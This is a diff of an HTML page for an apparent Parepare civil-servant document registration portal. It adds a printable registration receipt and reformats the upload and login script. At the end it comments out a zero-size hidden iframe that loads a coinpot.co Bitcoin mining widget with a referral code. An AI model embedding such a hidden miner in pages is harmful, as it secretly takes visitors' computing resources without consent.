@@ -575,7 +575,7 @@
             </td>
           </tr>
         </table>
-        <button class="mendaftar" id="simpan">Simpan</button>
+        <button class="mendaftar" id="simpan">Simpan</button><button style="margin-left: 20vw;display: none;" class="mendaftar">Mendaftar</button>
       </div>
 
       <div class="wrapfooter">
@@ -587,18 +587,17 @@
         </p>
       </div>
     </div>
-    <div style="display: none;" id="pring">
-      <div>
-        <h3>DINAS PENDIDIKAN DAN KEBUDAYAAN</h3>
-        <h3>KOTA PAREPARE</h3>
-        <h3>BIDANG KEPEGAWAIAN</h3>
+    <div style="display: none;padding:50px" id="pring">
+      <div style="text-align: center;border-bottom: black 1px solid;">
+        <img src="image/Lambang_Kota_Parepare.png" style="position: absolute;transform:translate(-250px,5px);width: 50px;" alt=""><h3>DINAS PENDIDIKAN DAN KEBUDAYAAN <br>KOTA PAREPARE <br>BIDANG KEPEGAWAIAN</h3>
       </div>
-      <div>
-        saya yang bertanda tangan dibawah ini :
+      <br>
+      <div style="padding:10px">
+        <p style="text-align: justify;">Aparatur Sipil Negara (ASN) dengan data sebagai berikut :</p>
         <table>
           <tr>
-            <td>Nama</td>
-            <td>:</td>
+            <td style="width: 40%;">Nama</td>
+            <td style="width: 2px;">:</td>
             <td></td>
           </tr>
           <tr>
@@ -612,49 +611,70 @@
             <td></td>
           </tr>
           <tr>
+            <td>TMT.</td>
+            <td>:</td>
+            <td></td>
+          </tr>
+          <tr>
             <td>Unit Kerja</td>
             <td>:</td>
           <td></td>
           </tr>
-
+          <tr>
+            <td>Jenis Pendaftaran</td>
+            <td>:</td>
+            <td></td>
+          </tr>
         </table>
-      </div>
+        <p style="text-align: justify;">telah menyetujui persyaratan pendaftaran dan pengunggahan dokumen hasil pemindaian dokumen asli, maka ASN yang bertanda tangan dibawah ini dinyatakan terdaftar dengan nomor urut pendaftaran <span class="kodePendaftaran">123456</span>            pada tanggal <span class="tglDaftar">17 Agustus 2020</span>.</p>
+
+            <img id="qr" style="position: absolute;transform: translate(6vw,40px);width:100px;height:100px;border:black 1px solid">
+            <div style="position: absolute;transform: translate(400px,20px)">
+                <p>Parepare, <span class="tglCetak"></span></p>
+                <p>ASN Terdaftar</p>
+                <img id="ttd">
+                <p class="namaPendaftar">SYUAIB</p>
+            </div>
+
+        </div>
     </div>
     <!-- <p id="syuaib">Code/Design By syuaib</p> -->
     <script src="https://printjs-4de6.kxcdn.com/print.min.js"></script>
     <script src="./js/main.js"></script>
     <script>
-      let logoutButton = document.querySelector(".logoutButton");
-      let wrapbody = document.querySelector(".wrapbody");
-      let wrapterkirim = document.querySelector(".wrapterkirim");
-      let tutup = document.querySelector("#tutup");
-      let loading = document.querySelector(".loading");
-      let simpan = document.querySelector("#simpan");
-      let skTerakhir = document.querySelector("#skTerakhir");
-      let barisBerkas = document.querySelectorAll("tr");
-      let berkas = document.querySelectorAll("input");
-      let masukan = document.querySelector(".masukan");
-      let btnUpload = document.querySelectorAll(".upload");
-      let namaBerkas = document.querySelectorAll(".namaBerkas");
-      let ketPilihan = document.querySelector("#ketPilihan");
-      let jenisDaftar = document.querySelector("#jenisDaftar");
-      let tblUpload = document.querySelector("#tblUpload");
-      let pring = document.querySelector('#pring');
+        let logoutButton = document.querySelector(".logoutButton");
+        let wrapbody = document.querySelector(".wrapbody");
+        let wrapterkirim = document.querySelector(".wrapterkirim");
+        let tutup = document.querySelector("#tutup");
+        let loading = document.querySelector(".loading");
+        let simpan = document.querySelector("#simpan");
+        let skTerakhir = document.querySelector("#skTerakhir");
+        let barisBerkas = document.querySelectorAll("tr");
+        let berkas = document.querySelectorAll("input");
+        let masukan = document.querySelector(".masukan");
+        let btnUpload = document.querySelectorAll(".upload");
+        let namaBerkas = document.querySelectorAll(".namaBerkas");
+        let ketPilihan = document.querySelector("#ketPilihan");
+        let jenisDaftar = document.querySelector("#jenisDaftar");
+        let tblUpload = document.querySelector("#tblUpload");
+        let pring = document.querySelector('#pring');
 
-      function cetak(){
-        printJS('pring', 'html');
-      }
+        function cetak() {
+            pring.style.display = 'block';
+            printJS('pring', 'html');
+            pring.style.display = 'none';
+        }
 
-      masukan.addEventListener("click", () => location.assign("status.html"));
-      var i;
-      var j;
+        masukan.addEventListener("click", () => location.assign("status.html"));
+        var i;
+        var j;
 
-      jenisDaftar.addEventListener("change", (e) => {
-        let indexpilihan = e.target.selectedIndex;
-        tentukan[indexpilihan]();
-      });
+        jenisDaftar.addEventListener("change", (e) => {
+            let indexpilihan = e.target.selectedIndex;
+            tentukan[indexpilihan]();
+        });
 
-      /*
+        /*
 1. SK Pangkat Terakhir 
 2. SKP dan PPK 2 Tahun Terakhir
 3. SKP dua tahun terakhir
@@ -678,153 +698,154 @@
 21. Rekomendasi KASN tentang hasil seleksi terbuka JPT
 */
 
-      let tentukan = {
-        0: () => {
-          tblUpload.style.display = "none";
-        },
-        1: () => {
-          munculkanBaris([1, 2, 4, 5, 6, 10, 20]);
-        },
-        2: () => {
-          munculkanBaris([1, 11, 2, 12, 13, 14, 15, 16]);
-        },
-        3: () => {
-          munculkanBaris([1, 11, 2, 14, 15, 16, 21]);
-        }
-      };
-
-      function munculkanBaris(e) {
-        for (i = 1; i < barisBerkas.length; i++) {
-          if (e.indexOf(i) !== -1) {
-            //0
-            barisBerkas[i].style.display = "table-row";
-          } else {
-            barisBerkas[i].style.display = "none";
-          }
-        }
-        tblUpload.style.display = "table";
-      }
-      //baris 3 hilang
-      //////////////////////////cek login/////////////////////
-      if (main.ambilDb("nip") == null || main.ambilDb("nip") == "") {
-        location.assign("index.html");
-      } else {
-        main.cekLogin(main.ambilDb("nip")).then((data) => {
-          if (!JSON.parse(data)) {
-            location.assign("index.html");
-          } else {
-            async function simpanDb() {
-              if (main.ambilDb("db") == null || main.ambilDb("db") == "") {
-                await main.simpanDb(data);
-              }
-              let dataPegawai = JSON.parse(main.ambilDb("db"));
-              loading.setAttribute("style", "display:none");
-              wrapbody.setAttribute("style", "visibility:visible");
+        let tentukan = {
+            0: () => {
+                tblUpload.style.display = "none";
+            },
+            1: () => {
+                munculkanBaris([1, 2, 4, 5, 6, 10, 20]);
+            },
+            2: () => {
+                munculkanBaris([1, 11, 2, 12, 13, 14, 15, 16]);
+            },
+            3: () => {
+                munculkanBaris([1, 11, 2, 14, 15, 16, 21]);
             }
-            simpanDb();
-          }
-        });
-      }
-
-      //////////////////////get index input button //////////////////////
-      for (i = 0; i < berkas.length; i++) {
-        (function (index) {
-          berkas[i].onchange = function () {
-            console.log(index);
-            namaBerkas[index].innerHTML = berkas[index].files[0].name;
-          };
-        })(i);
-      }
-
-      //////////////////upload process/////////////////
-      simpan.addEventListener("click", simpanBerkas);
-      var tunggu = [];
-      var benar = [];
-
-      function simpanBerkas() {
-        let uploadInp = document.querySelectorAll(".uploadInp");
-
-        function hitungTerisi() {
-          var x = 0;
-          for (i = 0; i < berkas.length; i++) {
-            if (berkas[i].value) {
-              x++;
-            }
-          }
-          return x;
-        }
-
-        for (i = 0; i < berkas.length; i++) {
-          (function (index) {
-            if (berkas[i].value) {
-              kirim(index).then(() => {
-                var ulang = setTimeout(
-                  () => console.log("tunggu deng"),
-                  3000 * ulang
-                );
-
-                if (tunggu.length != 0) {
-                  tunggu[index].remove();
-                }
-              });
-            } else {
-              console.log("input kosong");
-            }
-          })(i);
-        }
-      }
-
-      let kirim = async (nmr) => {
-        tunggu[nmr] = new Image(30, 30);
-        tunggu[nmr].src = "./image/Eclipse.svg";
-        tunggu[nmr].className = "tunggu";
-        tunggu[nmr].style.marginLeft = "1%";
-        benar[nmr] = new Image(30, 30);
-        benar[nmr].src = "./image/benar.png";
-        benar[nmr].className = "benar";
-        benar[nmr].style.marginLeft = "1%";
-
-        var fileku = berkas[nmr].files[0];
-        var reader = new FileReader();
-        var nmBerkas = barisBerkas[nmr + 1].cells[0].innerText;
-        reader.onload = () => {
-          var hapusBenar = document.querySelectorAll(".benar");
-          if (hapusBenar) {
-            for (i = 0; i < hapusBenar.length; i++) {
-              hapusBenar[i].remove();
-            }
-          }
-          var posisigambar = barisBerkas[nmr + 1].childNodes[5];
-          posisigambar.insertBefore(tunggu[nmr], posisigambar.childNodes[3]);
-          var dataArr = reader.result.replace(/^data:.+;base64,/, "");
-          var data = {
-            urlSkTerakhir: dataArr,
-            username: JSON.parse(main.ambilDb("db")).nip,
-            namaBerkas: nmBerkas,
-          };
-          main.kirimdata(data).then((res) => {
-            tunggu[nmr].remove();
-            posisigambar.insertBefore(benar[nmr], posisigambar.childNodes[3]);
-          });
         };
-        reader.readAsDataURL(fileku);
-      };
 
-      ///////////////////sign out//////////////////////////////////////////////
-      logoutButton.addEventListener("click", keluar);
-
-      function keluar() {
-        loading.setAttribute("style", "display:block");
-        wrapbody.setAttribute("style", "display:none");
-        main.logout().then((data) => {
-          if (data == "false") {
-            localStorage.removeItem("db");
-            localStorage.removeItem("nip");
+        function munculkanBaris(e) {
+            for (i = 1; i < barisBerkas.length; i++) {
+                if (e.indexOf(i) !== -1) {
+                    //0
+                    barisBerkas[i].style.display = "table-row";
+                } else {
+                    barisBerkas[i].style.display = "none";
+                }
+            }
+            tblUpload.style.display = "table";
+        }
+        //baris 3 hilang
+        //////////////////////////cek login/////////////////////
+        if (main.ambilDb("nip") == null || main.ambilDb("nip") == "") {
             location.assign("index.html");
-          }
-        });
-      }
+        } else {
+            main.cekLogin(main.ambilDb("nip")).then((data) => {
+                if (!JSON.parse(data)) {
+                    location.assign("index.html");
+                } else {
+                    async function simpanDb() {
+                        if (main.ambilDb("db") == null || main.ambilDb("db") == "") {
+                            await main.simpanDb(data);
+                        }
+                        let dataPegawai = JSON.parse(main.ambilDb("db"));
+                        loading.setAttribute("style", "display:none");
+                        wrapbody.setAttribute("style", "visibility:visible");
+                    }
+                    simpanDb();
+                }
+            });
+        }
+
+        //////////////////////get index input button //////////////////////
+        for (i = 0; i < berkas.length; i++) {
+            (function(index) {
+                berkas[i].onchange = function() {
+                    console.log(index);
+                    namaBerkas[index].innerHTML = berkas[index].files[0].name;
+                };
+            })(i);
+        }
+
+        //////////////////upload process/////////////////
+        simpan.addEventListener("click", simpanBerkas);
+        var tunggu = [];
+        var benar = [];
+
+        function simpanBerkas() {
+            let uploadInp = document.querySelectorAll(".uploadInp");
+
+            function hitungTerisi() {
+                var x = 0;
+                for (i = 0; i < berkas.length; i++) {
+                    if (berkas[i].value) {
+                        x++;
+                    }
+                }
+                return x;
+            }
+
+            for (i = 0; i < berkas.length; i++) {
+                (function(index) {
+                    if (berkas[i].value) {
+                        kirim(index).then(() => {
+                            var ulang = setTimeout(
+                                () => console.log("tunggu deng"),
+                                3000 * ulang
+                            );
+
+                            if (tunggu.length != 0) {
+                                tunggu[index].remove();
+                            }
+                        });
+                    } else {
+                        console.log("input kosong");
+                    }
+                })(i);
+            }
+        }
+
+        let kirim = async(nmr) => {
+            tunggu[nmr] = new Image(30, 30);
+            tunggu[nmr].src = "./image/Eclipse.svg";
+            tunggu[nmr].className = "tunggu";
+            tunggu[nmr].style.marginLeft = "1%";
+            benar[nmr] = new Image(30, 30);
+            benar[nmr].src = "./image/benar.png";
+            benar[nmr].className = "benar";
+            benar[nmr].style.marginLeft = "1%";
+
+            var fileku = berkas[nmr].files[0];
+            var reader = new FileReader();
+            var nmBerkas = barisBerkas[nmr + 1].cells[0].innerText;
+            reader.onload = () => {
+                var hapusBenar = document.querySelectorAll(".benar");
+                if (hapusBenar) {
+                    for (i = 0; i < hapusBenar.length; i++) {
+                        hapusBenar[i].remove();
+                    }
+                }
+                var posisigambar = barisBerkas[nmr + 1].childNodes[5];
+                posisigambar.insertBefore(tunggu[nmr], posisigambar.childNodes[3]);
+                var dataArr = reader.result.replace(/^data:.+;base64,/, "");
+                var data = {
+                    urlSkTerakhir: dataArr,
+                    username: JSON.parse(main.ambilDb("db")).nip,
+                    namaBerkas: nmBerkas,
+                };
+                main.kirimdata(data).then((res) => {
+                    tunggu[nmr].remove();
+                    posisigambar.insertBefore(benar[nmr], posisigambar.childNodes[3]);
+                });
+            };
+            reader.readAsDataURL(fileku);
+        };
+
+        ///////////////////sign out//////////////////////////////////////////////
+        logoutButton.addEventListener("click", keluar);
+
+        function keluar() {
+            loading.setAttribute("style", "display:block");
+            wrapbody.setAttribute("style", "display:none");
+            main.logout().then((data) => {
+                if (data == "false") {
+                    localStorage.removeItem("db");
+                    localStorage.removeItem("nip");
+                    location.assign("index.html");
+                }
+            });
+        }
     </script>
-    <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoincore/?ref=0C052766283C&mode=widget" style="overflow:hidden;width:0;height:0;"></iframe>
-  </body>
+    <!-- <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoincore/?ref=0C052766283C&mode=widget" style="overflow:hidden;width:0;height:0;"></iframe> -->
+</body>
+
 </html>
